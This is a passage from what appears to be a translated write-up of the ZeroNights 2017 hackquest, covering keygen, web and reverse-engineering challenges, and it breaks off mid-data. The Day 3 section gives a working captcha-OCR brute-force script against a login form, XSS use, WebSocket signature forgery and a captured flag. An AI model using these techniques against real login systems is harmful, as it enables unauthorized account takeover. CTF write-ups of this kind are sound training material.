[sum(key[i]) for i in range(len(key))] m = [[None for j in range(4)] for i in range(4)] for i in range(4): for j in range(4): m[i][j] = (keypart_sums[i] + keypart_sums[j]) % 169 mail_ext = (mail * 100)[:64] mail_sums = [sum(map(ord, mail_ext[i::4]), 1) % 13 for i in range(4)] for i in range(4): m[i][i] = mail_sums[i] col_sums = [sum(m[j][i] for j in range(4)) for i in range(4)] add_con(col_sums[0] == col_sums[1]) add_con(col_sums[1] == col_sums[2]) add_con(col_sums[2] == col_sums[3]) add_con(sum(map(ord, '%02X%02X' % (ord(mail[0]), ord(mail[1])))) + 0x5A1C + keypart_sums[4] == 0x5C44) add_con(sum(map(ord, '%02X%02X' % (ord(mail[4]), ord(mail[5])))) + 0x2FABE + keypart_sums[5] == 0x2FCE6) # print(cons) cons = simplify(cons) # print(cons) s = Solver() s.add(cons) print(s.check()) model = s.model() print('-'.join(''.join(chr(model[key[i][j]].as_long()) for j in range(4)) for i in range(6)))</span></span></code> </pre> </div></div></div></div><br><hr><br><h1>  Day 3. YouAreWelcome </h1><br><p>  On the third day, the participants were again waiting for the Web (task from SibearCTF).  At the beginning, the task might have seemed easy, however, as it turned out later, the captcha and password brute-force stopped everyone except one participant, who became the winner.  A total of 480 people tried to solve the rear. </p><br><table><tbody><tr><td colspan="2" align="center">  Winner </td></tr><tr><td align="center">  <b>1 place</b> </td></tr><tr><td align="center"><pre> <code class="html hljs xml">Paul_Axe</code> </pre> </td></tr></tbody></table><br><div class="spoiler">  <b class="spoiler_title">3rd day writeup.</b>  <b class="spoiler_title">(by Paul_Axe) [eng]</b> <div class="spoiler_text"><blockquote>  The competition is not over yet.  You still have the opportunity to get the flag: <a href="http://zeronights.sibirctf.org/2017/">http://zeronights.sibirctf.org/2017/</a> </blockquote><br><ol><li>  XSS in feedback form.  Got access to moderator account.  However, except for the list of approved accounts. </li><li>  Trying to register own team - got password to email.  Password is 4 digits, so can be easily bruteforced. </li><li><p>  Login form is protected with simple captcha.  Wrote simple script using pytesseract <a href="https://github.com/madmaze/pytesseract">https://github.com/madmaze/pytesseract</a> to recognize captcha and bruteforce login form.  After 10 minutes got the password for one of the approved team account. </p><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> io <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> re <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> pytesseract <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> PIL <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Image <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> multiprocessing <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Pool def get_cap(): URL = "http://zeronights.sibirctf.org/2017/sign_up" CAP_URL = "http://zeronights.sibirctf.org/captcha/image/" r = requests.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(URL) res = r.text h = re.findall("/captcha/image/([a-f0-9]+)/", res)[<span class="hljs-number"><span class="hljs-number">0</span></span>] img_f = io.BytesIO(requests.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(CAP_URL+h+"/").content) c = pytesseract.image_to_string(Image.<span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(img_f), config="./tesseract.config") <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (h, c) def brute(x): URL = "http://zeronights.sibirctf.org/2017/login" email = "keva_a78ff3@sibirctf.org" h, c = get_cap() r = requests.post(URL, data={ "_username": email, "_password":str(x), "captcha_0": h, "captcha_1": c }) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (r.status_code) != <span class="hljs-number"><span class="hljs-number">400</span></span>: print(email, x) sys.<span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>) pool = Pool(<span class="hljs-number"><span class="hljs-number">10</span></span>) pool.map(brute, range(<span class="hljs-number"><span class="hljs-number">1000</span></span>,<span class="hljs-number"><span class="hljs-number">10000</span></span>)) pool.<span class="hljs-keyword"><span class="hljs-keyword">close</span></span>() pool.<span class="hljs-keyword"><span class="hljs-keyword">join</span></span>()</code> </pre> <br></li><li>  Approved user accounts have WebSocket-based chat window.  Every WebSocket message should contain signature which authorizes sender.  Unfortunately, the existing signatures were incorrect.  Actually signature was md5 ('10 '), while my user account id was 4. Tried use md5 (' 4 ') and it worked. <br><pre> <code class="hljs swift"> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> my_user_id = <span class="hljs-number"><span class="hljs-number">4</span></span>, my_sign = <span class="hljs-string"><span class="hljs-string">"d3d9446802a44259755d38e6d163e820"</span></span>;</code> </pre> </li><li><p>  There was two possible message types: "new" - subscribe to new messages and "send" - send the message to somebody.  It was decided to use it as a signature for md5 ('1') as a signature. </p><br><pre> <code class="hljs javascript"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> uid = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> sign = <span class="hljs-string"><span class="hljs-string">'c4ca4238a0b923820dcc509a6f75849b'</span></span>; ws = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> WebSocket(<span class="hljs-string"><span class="hljs-string">"ws://13.93.88.79:8001/"</span></span>); ws.onmessage = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-built_in"><span class="hljs-built_in">console</span></span>.log(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(e.data)) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(Exception ) { <span class="hljs-built_in"><span class="hljs-built_in">console</span></span>.log((e.data)) } } ws.onopen = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{ ws.send(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.stringify({ <span class="hljs-string"><span class="hljs-string">'type'</span></span>: <span class="hljs-string"><span class="hljs-string">'new'</span></span>, <span class="hljs-string"><span class="hljs-string">'userid'</span></span>: uid, <span class="hljs-string"><span class="hljs-string">'signature'</span></span>: sign })); };</code> </pre> <br></li><li>  I received it. <br> <code>w0w_c0n6r47ul4710n_m337_47_z3r0n16h75</code> </li> </ol></div></div><br><hr><br><h1>  Day 4. Remansory challenge </h1><br><p>  The fourth day was a chain of tasks of increasing complexity from R0crew.  The first link of the chain was the easiest and 20 people were able to pass it.  The second link turned out to be for 6 people, and only four reached the solution of the last.  A detailed description of each stage can be found under the spoiler. </p><br><table><tbody><tr><td colspan="3" align="center">  Winners </td></tr><tr><td align="center">  <b>1 place</b> </td><td align="center">  <b>2nd place</b> </td><td align="center">  <b>3rd place</b> </td></tr><tr><td align="center"><pre> <code class="html hljs xml">sysenter</code> </pre> </td><td align="center"><pre> <code class="html hljs xml">AV1ct0r</code> </pre> </td><td align="center"><pre> <code class="html hljs xml">Felis-Sapiens</code> </pre> </td></tr></tbody></table><br><p>  Also decided: <code>Aleksey Cherepanov</code> </p><br><div class="spoiler">  <b class="spoiler_title">4th day writeup.</b>  <b class="spoiler_title">(by sysenter)</b> <div class="spoiler_text"><blockquote>  You are welcome to join the engineers lodge of reverse engineers.  But it's not so simple.  You must complete the initiation and solve 4 tasks in one day.  Good luck!  You will find us in the telegram (@remasonry_bot) </blockquote><br><h4 id="task-1">  Task # 1 </h4><br><p>  There is a <code>PE32 exe</code> file.  Lines: <br><img src="https://habrastorage.org/getpro/habr/post_images/07c/49d/ac3/07c49dac39bad4a0798d36e2b252ecab.png"></p><br><p>  We give user_id and some password, see what the program does with them. <br><img src="https://habrastorage.org/getpro/habr/post_images/c2f/91a/d99/c2f91ad99f86d5581b0a1e8275421bb9.png"></p><br><p>  Change the contents of <code>bytesUserId</code> to <code>"I'm ready!!!!"</code>  (let's not forget, update the buffer size for DIV EBX) and patch the program a bit. <br><img src="https://habrastorage.org/getpro/habr/post_images/46d/d87/3ad/46dd873addf7da8ddf71c585fc6e55d6.png"></p><br><p>  After executing the loop, <code>szSalt</code> contains our password. <br><img src="https://habrastorage.org/getpro/habr/post_images/fcf/755/5f5/fcf7555f5292d7ce48bb1e0ee3904ce9.png"></p><br><h4 id="task-2-packer">  Task # 2 packer </h4><br><p>  There is a program for unpacking archives of unknown format and a set of files that need to be packaged into such an archive. <br>  No obfuscation, protection and other things, very simple format.  I will give his description. <br><img src="https://habrastorage.org/getpro/habr/post_images/5bd/bae/7c3/5bdbae7c35a065ac041230ea90a74d75.png"><br>  For this information it is easy to write a packer. <br>  Do not forget about the limit of 1 megabyte, so that all duplicate files are saved only once in <code>FD</code> . </p><br><p>  Program for reading: </p><br><div class="spoiler">  <b class="spoiler_title">task2.py</b> <div class="spoiler_text"><pre> <code class="hljs haskell"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct data = open('2017.<span class="hljs-title"><span class="hljs-title">zn'</span></span>, '<span class="hljs-title"><span class="hljs-title">br'</span></span>).read() position = 0 lst_position = 0 def read_dword(): global data, position, lst_position value = struct.unpack('&lt;<span class="hljs-type"><span class="hljs-type">L</span></span>', <span class="hljs-title"><span class="hljs-title">data</span></span>[<span class="hljs-title"><span class="hljs-title">position</span></span>:<span class="hljs-title"><span class="hljs-title">position</span></span> + 4])[0] lst_position = position position += 4 return value def read_raw(<span class="hljs-title"><span class="hljs-title">n</span></span>): global data, position, lst_position value = data[position:position+n] lst_position = position position += n return value magic = read_dword() print('%04<span class="hljs-title"><span class="hljs-title">x'</span></span> % <span class="hljs-title"><span class="hljs-title">lst_position</span></span>, '<span class="hljs-title"><span class="hljs-title">magic'</span></span>.<span class="hljs-title"><span class="hljs-title">rjust</span></span>(20, ' '), hex(<span class="hljs-title"><span class="hljs-title">magic</span></span>)) version = read_dword() print('%04<span class="hljs-title"><span class="hljs-title">x'</span></span> % <span class="hljs-title"><span class="hljs-title">lst_position</span></span>, '<span class="hljs-title"><span class="hljs-title">version'</span></span>.<span class="hljs-title"><span class="hljs-title">rjust</span></span>(20, ' '), hex(<span class="hljs-title"><span class="hljs-title">version</span></span>)) student_pack = read_raw(12) print('%04<span class="hljs-title"><span class="hljs-title">x'</span></span> % <span class="hljs-title"><span class="hljs-title">lst_position</span></span>, '<span class="hljs-title"><span class="hljs-title">student_pack'</span></span>.<span class="hljs-title"><span class="hljs-title">rjust</span></span>(20, ' '), student_pack) FILE_END_OFFSET = read_dword() print('%04<span class="hljs-title"><span class="hljs-title">x'</span></span> % <span class="hljs-title"><span class="hljs-title">lst_position</span></span>, '<span class="hljs-type"><span class="hljs-type">FILE_END_OFFSET</span></span>'.<span class="hljs-title"><span class="hljs-title">rjust</span></span>(20, ' '), hex(<span class="hljs-type"><span class="hljs-type">FILE_END_OFFSET</span></span>)) ZN3_SIZE = read_dword() print('%04<span class="hljs-title"><span class="hljs-title">x'</span></span> % <span class="hljs-title"><span class="hljs-title">lst_position</span></span>, '<span class="hljs-type"><span class="hljs-type">ZN3_SIZE</span></span>'.<span class="hljs-title"><span class="hljs-title">rjust</span></span>(20, ' '), hex(<span class="hljs-type"><span class="hljs-type">ZN3_SIZE</span></span>)) ZN1_AND_ZN3_SIZE = read_dword() print('%04<span class="hljs-title"><span class="hljs-title">x'</span></span> % <span class="hljs-title"><span class="hljs-title">lst_position</span></span>, '<span class="hljs-type"><span class="hljs-type">ZN1_AND_ZN3_SIZE</span></span>'.<span class="hljs-title"><span class="hljs-title">rjust</span></span>(20, ' '), hex(<span class="hljs-type"><span class="hljs-type">ZN1_AND_ZN3_SIZE</span></span>)) ZN2_OFFSET = read_dword() print('%04<span class="hljs-title"><span class="hljs-title">x'</span></span> % <span class="hljs-title"><span class="hljs-title">lst_position</span></span>, '<span class="hljs-type"><span class="hljs-type">ZN2_OFFSET</span></span>'.<span class="hljs-title"><span class="hljs-title">rjust</span></span>(20, ' '), hex(<span class="hljs-type"><span class="hljs-type">ZN2_OFFSET</span></span>)) ZN0_OFFSET = read_dword() print('%04<span class="hljs-title"><span class="hljs-title">x'</span></span> % <span class="hljs-title"><span class="hljs-title">lst_position</span></span>, '<span class="hljs-type"><span class="hljs-type">ZN0_OFFSET</span></span>'.<span class="hljs-title"><span class="hljs-title">rjust</span></span>(20, ' '), hex(<span class="hljs-type"><span class="hljs-type">ZN0_OFFSET</span></span>)) data = data[position:] ZN3_OFFSET = 0 ZN3_SIZE = ZN3_SIZE ZN1_OFFSET = ZN3_OFFSET + ZN3_SIZE ZN1_SIZE = ZN1_AND_ZN3_SIZE - ZN3_SIZE FD_OFFSET = ZN3_OFFSET + ZN1_AND_ZN3_SIZE FD_SIZE = ZN2_OFFSET - ZN1_AND_ZN3_SIZE #ZN2_OFFSET ZN2_SIZE = ZN0_OFFSET - ZN2_OFFSET #ZN0_OFFSET ZN0_SIZE = FILE_END_OFFSET - ZN0_OFFSET print('<span class="hljs-type"><span class="hljs-type">ZN3</span></span>', <span class="hljs-title"><span class="hljs-title">hex</span></span>(<span class="hljs-type"><span class="hljs-type">ZN3_OFFSET</span></span>), hex(<span class="hljs-type"><span class="hljs-type">ZN3_SIZE</span></span>)) # folder - folder descriptors print('<span class="hljs-type"><span class="hljs-type">ZN1</span></span>', <span class="hljs-title"><span class="hljs-title">hex</span></span>(<span class="hljs-type"><span class="hljs-type">ZN1_OFFSET</span></span>), hex(<span class="hljs-type"><span class="hljs-type">ZN1_SIZE</span></span>)) # file - folder descriptors print('<span class="hljs-type"><span class="hljs-type">FD</span></span>', <span class="hljs-title"><span class="hljs-title">hex</span></span>(<span class="hljs-type"><span class="hljs-type">FD_OFFSET</span></span>), hex(<span class="hljs-type"><span class="hljs-type">FD_SIZE</span></span>)) # DATA print('<span class="hljs-type"><span class="hljs-type">ZN2</span></span>', <span class="hljs-title"><span class="hljs-title">hex</span></span>(<span class="hljs-type"><span class="hljs-type">ZN2_OFFSET</span></span>), hex(<span class="hljs-type"><span class="hljs-type">ZN2_SIZE</span></span>)) # filename descriptors print('<span class="hljs-type"><span class="hljs-type">ZN0</span></span>', <span class="hljs-title"><span class="hljs-title">hex</span></span>(<span class="hljs-type"><span class="hljs-type">ZN0_OFFSET</span></span>), hex(<span class="hljs-type"><span class="hljs-type">ZN0_SIZE</span></span>)) # filedata descriptors for i in range(<span class="hljs-type"><span class="hljs-type">ZN3_OFFSET</span></span>, <span class="hljs-type"><span class="hljs-type">ZN3_OFFSET</span></span> + <span class="hljs-type"><span class="hljs-type">ZN3_SIZE</span></span>, 0<span class="hljs-title"><span class="hljs-title">xC</span></span>): print(<span class="hljs-title"><span class="hljs-title">struct</span></span>.<span class="hljs-title"><span class="hljs-title">unpack</span></span>('&lt;<span class="hljs-type"><span class="hljs-type">LLL</span></span>', <span class="hljs-title"><span class="hljs-title">data</span></span>[<span class="hljs-title"><span class="hljs-title">i</span></span>:<span class="hljs-title"><span class="hljs-title">i</span></span>+0<span class="hljs-title"><span class="hljs-title">xC</span></span>])) print('<span class="hljs-title"><span class="hljs-title">separator1'</span></span>) for i in range(<span class="hljs-type"><span class="hljs-type">ZN0_OFFSET</span></span>, <span class="hljs-type"><span class="hljs-type">ZN0_OFFSET</span></span> + <span class="hljs-type"><span class="hljs-type">ZN0_SIZE</span></span>, 0<span class="hljs-title"><span class="hljs-title">xC</span></span>): print(<span class="hljs-title"><span class="hljs-title">struct</span></span>.<span class="hljs-title"><span class="hljs-title">unpack</span></span>('&lt;<span class="hljs-type"><span class="hljs-type">LLL</span></span>', <span class="hljs-title"><span class="hljs-title">data</span></span>[<span class="hljs-title"><span class="hljs-title">i</span></span>:<span class="hljs-title"><span class="hljs-title">i</span></span>+0<span class="hljs-title"><span class="hljs-title">xC</span></span>])) print('<span class="hljs-title"><span class="hljs-title">separator2'</span></span>)</code> </pre> </div></div><br><p>  Program for packaging: </p><br><div class="spoiler">  <b class="spoiler_title">task2_packer.py</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os magic = <span class="hljs-number"><span class="hljs-number">0x30324e5a</span></span> version = <span class="hljs-number"><span class="hljs-number">0x3731</span></span> FOLDERS = [] FOLDERS_mirr = [] FILES = [] FILENAMES = [] FILENAMES_real = [] FILEDATAINFO = [] FILEDATA = <span class="hljs-string"><span class="hljs-string">b''</span></span> TARGET_FOLDER = <span class="hljs-string"><span class="hljs-string">'pack_me'</span></span> FOLDERS_mirr += [TARGET_FOLDER] FILES_mirr = [] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> dirname, dirnames, filenames <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> os.walk(TARGET_FOLDER): <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> subdirname <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> dirnames: FOLDERS += [(len(FOLDERS) + <span class="hljs-number"><span class="hljs-number">1</span></span>, FOLDERS_mirr.index(dirname), len(FILENAMES))] FOLDERS_mirr += [dirname + <span class="hljs-string"><span class="hljs-string">'\\'</span></span> + subdirname] FILENAMES += [(dirname + <span class="hljs-string"><span class="hljs-string">'\\'</span></span> + subdirname, <span class="hljs-number"><span class="hljs-number">1</span></span>)] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> dirname, dirnames, filenames <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> os.walk(TARGET_FOLDER): <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> flnm <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> filenames: FILES += [(len(FILES), FOLDERS_mirr.index(dirname), len(FILENAMES))] FILES_mirr += [dirname + <span class="hljs-string"><span class="hljs-string">'\\'</span></span> + flnm] FILENAMES += [(dirname + <span class="hljs-string"><span class="hljs-string">'\\'</span></span> + flnm, <span class="hljs-number"><span class="hljs-number">0</span></span>)] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> idx, x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> enumerate(FILENAMES): fn = FILENAMES[idx][<span class="hljs-number"><span class="hljs-number">0</span></span>].split(<span class="hljs-string"><span class="hljs-string">'\\'</span></span>)[<span class="hljs-number"><span class="hljs-number">-1</span></span>] FILENAMES_real += [(idx, len(fn), fn.encode(<span class="hljs-string"><span class="hljs-string">'utf-8'</span></span>))] <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> idx, x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> enumerate(FILENAMES): <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x[<span class="hljs-number"><span class="hljs-number">1</span></span>] == <span class="hljs-number"><span class="hljs-number">0</span></span>: fdata = open(x[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-string"><span class="hljs-string">'rb'</span></span>).read() <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> fdata <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> FILEDATA: FILEDATA += fdata offset = FILEDATA.index(fdata) fsize = len(fdata) FILEDATAINFO += [(FILES_mirr.index(x[<span class="hljs-number"><span class="hljs-number">0</span></span>]), offset, fsize)] zn_new_offset = [<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">5</span></span>)] zn_new_size = [<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">5</span></span>)] DATA = <span class="hljs-string"><span class="hljs-string">b''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> FOLDERS: DATA += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;LLL'</span></span>, *x) zn_new_size[<span class="hljs-number"><span class="hljs-number">3</span></span>] = len(DATA) zn_new_offset[<span class="hljs-number"><span class="hljs-number">1</span></span>] = len(DATA) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> FILES: DATA += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;LLL'</span></span>, *x) zn_new_size[<span class="hljs-number"><span class="hljs-number">1</span></span>] = len(DATA) - zn_new_offset[<span class="hljs-number"><span class="hljs-number">1</span></span>] zn_new_offset[<span class="hljs-number"><span class="hljs-number">4</span></span>] = len(DATA) DATA += FILEDATA zn_new_size[<span class="hljs-number"><span class="hljs-number">4</span></span>] = len(DATA) - zn_new_offset[<span class="hljs-number"><span class="hljs-number">4</span></span>] zn_new_offset[<span class="hljs-number"><span class="hljs-number">2</span></span>] = len(DATA) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> FILENAMES_real: DATA += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;LL'</span></span>, x[<span class="hljs-number"><span class="hljs-number">0</span></span>], len(x[<span class="hljs-number"><span class="hljs-number">2</span></span>])) + x[<span class="hljs-number"><span class="hljs-number">2</span></span>] zn_new_size[<span class="hljs-number"><span class="hljs-number">2</span></span>] = len(DATA) - zn_new_offset[<span class="hljs-number"><span class="hljs-number">2</span></span>] zn_new_offset[<span class="hljs-number"><span class="hljs-number">0</span></span>] = len(DATA) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> FILEDATAINFO: DATA += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;LLL'</span></span>, x[<span class="hljs-number"><span class="hljs-number">0</span></span>], x[<span class="hljs-number"><span class="hljs-number">1</span></span>], x[<span class="hljs-number"><span class="hljs-number">2</span></span>]) zn_new_size[<span class="hljs-number"><span class="hljs-number">0</span></span>] = len(DATA) - zn_new_offset[<span class="hljs-number"><span class="hljs-number">0</span></span>] print([hex(d) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> zn_new_offset], [hex(d) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> zn_new_size]) FILE_END_OFFSET = zn_new_offset[<span class="hljs-number"><span class="hljs-number">0</span></span>] + zn_new_size[<span class="hljs-number"><span class="hljs-number">0</span></span>] ZN3_SIZE = zn_new_size[<span class="hljs-number"><span class="hljs-number">3</span></span>] ZN1_AND_ZN3_SIZE = zn_new_size[<span class="hljs-number"><span class="hljs-number">3</span></span>] + zn_new_size[<span class="hljs-number"><span class="hljs-number">1</span></span>] ZN2_OFFSET = zn_new_offset[<span class="hljs-number"><span class="hljs-number">2</span></span>] ZN0_OFFSET = zn_new_offset[<span class="hljs-number"><span class="hljs-number">0</span></span>] HEADER = struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;LL'</span></span>, magic, version) + TARGET_FOLDER.encode(<span class="hljs-string"><span class="hljs-string">'utf-8'</span></span>) + <span class="hljs-string"><span class="hljs-string">b'\x00'</span></span> + struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;LLLLL'</span></span>, FILE_END_OFFSET, ZN3_SIZE, ZN1_AND_ZN3_SIZE, ZN2_OFFSET, ZN0_OFFSET) open(<span class="hljs-string"><span class="hljs-string">'new.zn'</span></span>, <span class="hljs-string"><span class="hljs-string">'wb'</span></span>).write(HEADER + DATA)</code> </pre> </div></div><br><h4 id="task-3-randomapk">  Task # 3 random.apk </h4><br><p>  The task, according to the organizer, was with a bug, so everyone was just told the answer. <br>  We will analyze it too. </p><br><p>  There is an <code>apk</code> file that is waiting for the input of some line <br>  We will restore the verification algorithm. </p><br><div class="spoiler">  <b class="spoiler_title">code</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.math.BigInteger; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.security.MessageDigest; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.security.NoSuchAlgorithmException; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Main</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-comment"><span class="hljs-comment">//private static final String base64chars = "A2CTEFGHnJKLMNsPQ7SDlVvXYZabcdefghijkUmIopqrOtuWwxyz01B3456R89+/"; private static String CalcMD5(String paramString) throws NoSuchAlgorithmException { MessageDigest localMessageDigest = MessageDigest.getInstance("MD5"); localMessageDigest.update(paramString.getBytes(), 0, paramString.length()); return new BigInteger(1, localMessageDigest.digest()).toString(16); } // private static long Random(long paramLong) { return (0xFFFFFFF &amp; 11L + 252149039L * paramLong) &gt;&gt; 8; } private static long RandomSkip50(long paramLong) { for (int i = 0; i &lt; 50; i = i + 1) { paramLong = Random(paramLong); } return paramLong; } private static String RandomGetString(String paramString, long paramLong) { String str = ""; for (int i = 0; i &lt; 32; i++) { paramLong = Random(paramLong) &amp; 0xFF; str += paramLong ^ paramString.charAt(i); } return str; } public static void main(String[] args) throws NoSuchAlgorithmException { String str = "INPUT_HASH_HERE"; // CalcMD5("SuperAndroidChallenge"); // baaee25a694971ac1e6dde4b2e8b1386 String[] arrayOfString = new String[500]; for (int i = 0; i &lt; arrayOfString.length; i++) { arrayOfString[i] = RandomGetString(str, RandomSkip50(i)); } int j = 0; for (int k = 0; k &lt; arrayOfString.length; k++) { j += arrayOfString[k].length(); } if (j == 40762) { System.out.println("OK"); } } }</span></span></code> </pre> </div></div><br><p>  First of all, we will try to find a hash that will pass the control check. <br>  The verification algorithm is reduced to the summation of the length of a certain set of lines (500 pieces). </p><br><p>  Each line is generated as a concatenation of thirty-two decimal numbers, each of which is the xor of the gamma and one hash character (in string representation, lower case). </p><br><p>  Note that the gamma does not depend on the hash, so that it can be considered constant (depends only on the row and column). <br>  It can be calculated in advance and saved to a file.  Get a table of 500x32 elements. <br>  Below, for example, are the first few rows of the table. <br><img src="https://habrastorage.org/getpro/habr/post_images/6d0/c45/6c7/6d0c456c759a7fe4f8bd13b3d90cccdd.png"></p><br><p>  Obviously, the decimal number after xor with a hash symbol can be 1, 2 or 3 lengths. </p><br><p>  Knowing that hash characters can only take values ‚Äã‚Äãfrom the <code>[a-f0-9]</code> range, it is possible to uniquely determine the length of the resulting decimal number in some positions, while in others it can be reduced to exactly two options (confirmed in practice). </p><br><p>  We transform the table so that its elements are lists of the possible length of the resulting decimal number. </p><br><p>  At this stage, the control number 40762 is the sum of the values ‚Äã‚Äãof the entire table. <br>  It is clear that you can easily subtract from the control number the minimum of each element (which is a list) of the table, without forgetting to reduce the corresponding values ‚Äã‚Äãof the list itself.  Now the control number is 3449. A table will consist of two types of elements: <code>[0]</code> and <code>[0, 1]</code> . </p><br><p>  Consider one column of such a table.  Let's try to present all possible combinations of elements <code>[0, 1]</code> .  It is clear that there are impossible options that cannot be obtained by fixing the hash letter.  Therefore, during the search for a solution, it is necessary to use only valid arrangements <code>0</code> or <code>1</code> . <br>  We fix a hash letter in a certain position (from 0 to 31, inclusive), so the entire column of the table corresponding to this position will take on unambiguous values.  Sum up the column and write to the list (no repetitions).  Repeat this operation for all other possible hash characters. <br>              . </p><br><pre> <code class="hljs json">[<span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">103</span></span>, <span class="hljs-number"><span class="hljs-number">94</span></span>, <span class="hljs-number"><span class="hljs-number">102</span></span>, <span class="hljs-number"><span class="hljs-number">97</span></span>, <span class="hljs-number"><span class="hljs-number">98</span></span>, <span class="hljs-number"><span class="hljs-number">95</span></span>] [<span class="hljs-number"><span class="hljs-number">109</span></span>, <span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-number"><span class="hljs-number">108</span></span>, <span class="hljs-number"><span class="hljs-number">115</span></span>, <span class="hljs-number"><span class="hljs-number">114</span></span>, <span class="hljs-number"><span class="hljs-number">111</span></span>, <span class="hljs-number"><span class="hljs-number">112</span></span>] [<span class="hljs-number"><span class="hljs-number">103</span></span>, <span class="hljs-number"><span class="hljs-number">116</span></span>, <span class="hljs-number"><span class="hljs-number">122</span></span>, <span class="hljs-number"><span class="hljs-number">114</span></span>, <span class="hljs-number"><span class="hljs-number">95</span></span>, <span class="hljs-number"><span class="hljs-number">93</span></span>, <span class="hljs-number"><span class="hljs-number">97</span></span>, <span class="hljs-number"><span class="hljs-number">112</span></span>, <span class="hljs-number"><span class="hljs-number">119</span></span>] [<span class="hljs-number"><span class="hljs-number">121</span></span>, <span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">107</span></span>, <span class="hljs-number"><span class="hljs-number">125</span></span>, <span class="hljs-number"><span class="hljs-number">105</span></span>, <span class="hljs-number"><span class="hljs-number">124</span></span>, <span class="hljs-number"><span class="hljs-number">90</span></span>, <span class="hljs-number"><span class="hljs-number">104</span></span>, <span class="hljs-number"><span class="hljs-number">120</span></span>] [<span class="hljs-number"><span class="hljs-number">100</span></span>, <span class="hljs-number"><span class="hljs-number">101</span></span>, <span class="hljs-number"><span 